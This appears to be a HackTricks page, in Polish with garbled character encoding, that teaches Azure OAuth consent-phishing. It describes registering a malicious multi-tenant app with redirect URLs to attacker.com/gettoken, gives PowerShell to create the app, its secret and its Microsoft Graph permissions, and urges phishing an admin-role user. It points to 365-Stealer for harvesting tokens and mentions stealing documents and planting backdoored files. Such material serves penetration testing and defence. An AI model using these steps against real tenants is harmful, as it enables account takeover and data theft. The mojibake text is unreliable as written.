# Az - Nielegalne przyznanie zgody

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Phishing aplikacji OAuth

**Aplikacje Azure** proszÄ… o uprawnienia dostÄ™pu do **danych uÅ¼ytkownika** (podstawowe informacje, ale takÅ¼e dostÄ™p do dokumentÃ³w, wysyÅ‚anie e-maili...).\
JeÅ›li zostanÄ… **zaakceptowane**, zwykÅ‚y uÅ¼ytkownik moÅ¼e udzieliÄ‡ zgody tylko na **"niski wpÅ‚yw" uprawnieÅ„**. W **wszystkich innych** przypadkach wymagana jest **zgoda administratora**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` oraz niestandardowa rola zawierajÄ…ca `uprawnienia do przyznawania uprawnieÅ„ aplikacjom` mogÄ… udzieliÄ‡ zgody na poziomie caÅ‚ego najemcy.

Tylko uprawnienia, ktÃ³re **nie wymagajÄ… zgody administratora**, sÄ… klasyfikowane jako **niski wpÅ‚yw**. SÄ… to uprawnienia wymagane do **podstawowego logowania: openid, profile, email, User.Read i offline\_access**. JeÅ›li **organizacja** **zezwala** na zgodÄ™ uÅ¼ytkownika dla **wszystkich aplikacji**, pracownik moÅ¼e udzieliÄ‡ zgody na aplikacjÄ™, aby **odczytaÄ‡ powyÅ¼sze z jego profilu**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

W zwiÄ…zku z tym, atakujÄ…cy moÅ¼e przygotowaÄ‡ **zÅ‚oÅ›liwÄ… aplikacjÄ™** i za pomocÄ… **phishingu** sprawiÄ‡, Å¼e uÅ¼ytkownik **zaakceptuje aplikacjÄ™ i ukradnie jego dane**.

### SprawdÅº, czy uÅ¼ytkownicy mogÄ… udzielaÄ‡ zgody

NastÄ™pujÄ…ce polecenie PowerShell jest uÅ¼ywane do sprawdzenia konfiguracji zgody dla uÅ¼ytkownikÃ³w w Azure Active Directory (Azure AD) dotyczÄ…cej ich zdolnoÅ›ci do udzielania zgody na aplikacje:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **WyÅ‚Ä…czanie zgody uÅ¼ytkownika**: Ta opcja zabrania uÅ¼ytkownikom udzielania uprawnieÅ„ aplikacjom. UÅ¼ytkownicy nie mogÄ… udzielaÄ‡ zgody na aplikacje.
* **UÅ¼ytkownicy mogÄ… wyraziÄ‡ zgodÄ™ na aplikacje od zweryfikowanych wydawcÃ³w lub Twojej organizacji, ale tylko dla wybranych uprawnieÅ„**: Ta opcja pozwala wszystkim uÅ¼ytkownikom wyraÅ¼aÄ‡ zgodÄ™ tylko na aplikacje wydane przez zweryfikowanego wydawcÄ™ oraz aplikacje zarejestrowane w Twojej wÅ‚asnej instancji. Dodaje to warstwÄ™ kontroli, pozwalajÄ…c na wyraÅ¼enie zgody tylko na okreÅ›lone uprawnienia.
* **UÅ¼ytkownicy mogÄ… wyraziÄ‡ zgodÄ™ na wszystkie aplikacje**: Ta opcja jest bardziej liberalna i pozwala wszystkim uÅ¼ytkownikom wyraÅ¼aÄ‡ zgodÄ™ na dowolne uprawnienia dla aplikacji, o ile te uprawnienia nie wymagajÄ… zgody administracyjnej.
* **Niestandardowa polityka zgody na aplikacje**: Ta opcja wskazuje, Å¼e obowiÄ…zuje niestandardowa polityka, ktÃ³ra moÅ¼e byÄ‡ dostosowana do konkretnych wymagaÅ„ organizacyjnych i moÅ¼e obejmowaÄ‡ kombinacjÄ™ ograniczeÅ„ opartych na wydawcy aplikacji, Å¼Ä…danych uprawnieniach aplikacji i innych czynnikach.


## **Zrozumienie ataku na nielegalne udzielanie zgody**

W ataku na nielegalne udzielanie zgody, atakujÄ…cy wprowadzajÄ… w bÅ‚Ä…d koÅ„cowych uÅ¼ytkownikÃ³w, aby udzielili uprawnieÅ„ aplikacji zÅ‚oÅ›liwej zarejestrowanej w Azure. RobiÄ… to, sprawiajÄ…c, Å¼e aplikacja wydaje siÄ™ wiarygodna, co prowadzi do nieÅ›wiadomego klikniÄ™cia przez ofiary przycisku "Akceptuj". W rezultacie Azure AD wydaje token dla witryny atakujÄ…cego, umoÅ¼liwiajÄ…c im dostÄ™p i manipulacjÄ™ danymi ofiary, takimi jak odczytywanie lub wysyÅ‚anie wiadomoÅ›ci e-mail i dostÄ™p do plikÃ³w, bez koniecznoÅ›ci posiadania konta organizacyjnego.

## **Przebieg ataku**

Atak obejmuje kilka krokÃ³w, ktÃ³re majÄ… na celu zaatakowanie ogÃ³lniejszej firmy. Oto, jak moÅ¼e siÄ™ to rozwinÄ…Ä‡:

1. **Rejestracja domeny i hostowanie aplikacji**: AtakujÄ…cy rejestruje domenÄ™ przypominajÄ…cÄ… wiarygodnÄ… witrynÄ™, na przykÅ‚ad "safedomainlogin.com". Pod tÄ… domenÄ… tworzona jest subdomena (np. "nazwafirmy.safedomainlogin.com"), na ktÃ³rej hostowana jest aplikacja zaprojektowana do przechwytywania kodÃ³w autoryzacji i Å¼Ä…dania tokenÃ³w dostÄ™pu.

2. **Rejestracja aplikacji w Azure AD**: AtakujÄ…cy rejestruje aplikacjÄ™ wielomandantowÄ… w swojej instancji Azure AD, nadajÄ…c jej nazwÄ™ firmy docelowej, aby wydawaÄ‡ siÄ™ wiarygodnÄ…. Konfiguruje on adres URL przekierowania aplikacji tak, aby wskazywaÅ‚ na subdomenÄ™ hostujÄ…cÄ… zÅ‚oÅ›liwÄ… aplikacjÄ™.

3. **Konfiguracja uprawnieÅ„**: AtakujÄ…cy konfiguruje aplikacjÄ™ z rÃ³Å¼nymi uprawnieniami interfejsu API (np. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Te uprawnienia, po ich udzieleniu przez uÅ¼ytkownika, pozwalajÄ… atakujÄ…cemu na wyciÄ…ganie poufnych informacji w imieniu uÅ¼ytkownika.

4. **Rozpowszechnianie zÅ‚oÅ›liwych linkÃ³w**: AtakujÄ…cy tworzy link zawierajÄ…cy identyfikator klienta zÅ‚oÅ›liwej aplikacji i udostÄ™pnia go wybranym uÅ¼ytkownikom, wprowadzajÄ…c ich w bÅ‚Ä…d, aby udzielili zgody.

## **Wykorzystanie narzÄ™dzi do przeprowadzenia ataku**

Atak moÅ¼e byÄ‡ uÅ‚atwiony za pomocÄ… narzÄ™dzi takich jak [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Przygotowanie przed atakiem:
JeÅ›li atakujÄ…cy ma pewien poziom dostÄ™pu do uÅ¼ytkownika w organizacji ofiary, moÅ¼e sprawdziÄ‡, czy polityka organizacji pozwala uÅ¼ytkownikowi na akceptowanie aplikacji:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Aby przeprowadziÄ‡ atak, atakujÄ…cy musiaÅ‚by utworzyÄ‡ **nowÄ… aplikacjÄ™ w swoim Azure Tenant** (w rejestracji aplikacji), skonfigurowanÄ… z uprawnieniami:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` znajduje siÄ™ w `Microsoft Graph` w `Delegated permissions`. (Uprawnienia aplikacji zawsze bÄ™dÄ… wymagaÄ‡ dodatkowej zgody).

* `User.ReadBasic.All` to uprawnienie, ktÃ³re umoÅ¼liwi odczytanie informacji o wszystkich uÅ¼ytkownikach w organizacji, jeÅ›li zostanie udzielone.
* PamiÄ™taj, Å¼e tylko role `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` oraz niestandardowa rola zawierajÄ…ca `uprawnienia do udzielania uprawnieÅ„ aplikacjom` mogÄ… udzieliÄ‡ zgody na poziomie caÅ‚ego tenantu. Dlatego powinieneÅ› **wyÅ‚udziÄ‡ dane uÅ¼ytkownika z jednÄ… z tych rÃ³l**, jeÅ›li chcesz, aby zatwierdziÅ‚ **aplikacjÄ™ wymagajÄ…cÄ… zgody administratora**.

MoÅ¼esz rÃ³wnieÅ¼ utworzyÄ‡ aplikacjÄ™ za pomocÄ… wiersza poleceÅ„ (cli) przy uÅ¼yciu:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

SprawdÅº [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), aby dowiedzieÄ‡ siÄ™, jak go skonfigurowaÄ‡.

{% hint style="warning" %}
ZauwaÅ¼, Å¼e uzyskany **token dostÄ™pu** bÄ™dzie dla **punktu koÅ„cowego graph** z zakresami: `User.Read` i `User.ReadBasic.All` (Å¼Ä…dane uprawnienia). Nie bÄ™dziesz w stanie wykonywaÄ‡ innych dziaÅ‚aÅ„ (ale wystarczÄ… one do **pobrania informacji o wszystkich uÅ¼ytkownikach** w organizacji).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ tego narzÄ™dzia do przeprowadzenia ataku.

## Post-Eksploatacja

Po uzyskaniu dostÄ™pu do uÅ¼ytkownika moÅ¼esz wykonywaÄ‡ takie czynnoÅ›ci, jak kradzieÅ¼ poufnych dokumentÃ³w, a nawet przesyÅ‚anie plikÃ³w dokumentÃ³w z backdoorami.

## Referencje

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
